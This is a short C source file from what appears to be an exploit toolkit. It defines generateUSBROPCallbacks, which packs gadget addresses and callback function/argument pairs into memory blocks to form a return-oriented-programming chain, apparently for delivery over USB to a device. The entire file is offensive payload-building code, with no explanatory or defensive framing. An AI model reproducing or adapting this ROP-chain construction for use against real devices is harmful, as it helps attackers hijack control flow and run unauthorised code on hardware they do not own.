#include <exploit/payloads/helpers.h>

size_t generateUSBROPCallbacks(uint8_t *buffer, uint64_t address, callback_t *callbacks, size_t callbackCount) {
    uint8_t block0[MAX_BLOCK_SIZE], block1[MAX_BLOCK_SIZE];
	size_t i, j, sz = 0, block0Size, block1Size;
	uint64_t reg;

	for(i = 0; i < callbackCount; i += 5) {
		block1Size = block0Size = 0;
		for(j = 0; j < 5; ++j) {
			address += MAX_BLOCK_SIZE / 5;
			if(j == 4) {
				address += MAX_BLOCK_SIZE;
			}
			if(i + j < callbackCount - 1) {
				reg = func_gadget;
				memcpy(block0 + block0Size, &reg, sizeof(reg));
				block0Size += sizeof(reg);
				reg = address;
				memcpy(block0 + block0Size, &reg, sizeof(reg));
				block0Size += sizeof(reg);
				reg = callbacks[i + j].arg;
				memcpy(block1 + block1Size, &reg, sizeof(reg));
				block1Size += sizeof(reg);
				reg = callbacks[i + j].func;
				memcpy(block1 + block1Size, &reg, sizeof(reg));
				block1Size += sizeof(reg);
			} else if(i + j == callbackCount - 1) {
				reg = func_gadget;
				memcpy(block0 + block0Size, &reg, sizeof(reg));
				block0Size += sizeof(reg);
				reg = 0;
				memcpy(block0 + block0Size, &reg, sizeof(reg));
				block0Size += sizeof(reg);
				reg = callbacks[i + j].arg;
				memcpy(block1 + block1Size, &reg, sizeof(reg));
				block1Size += sizeof(reg);
				reg = callbacks[i + j].func;
				memcpy(block1 + block1Size, &reg, sizeof(reg));
				block1Size += sizeof(reg);
			} else {
				reg = 0;
				memcpy(block0 + block0Size, &reg, sizeof(reg));
				block0Size += sizeof(reg);
				reg = 0;
				memcpy(block0 + block0Size, &reg, sizeof(reg));
				block0Size += sizeof(reg);
			}
		}
		memcpy(buffer + sz, block0, block0Size);
		sz += block0Size;
		memcpy(buffer + sz, block1, block1Size);
		sz += block1Size;
	}
	return sz;
}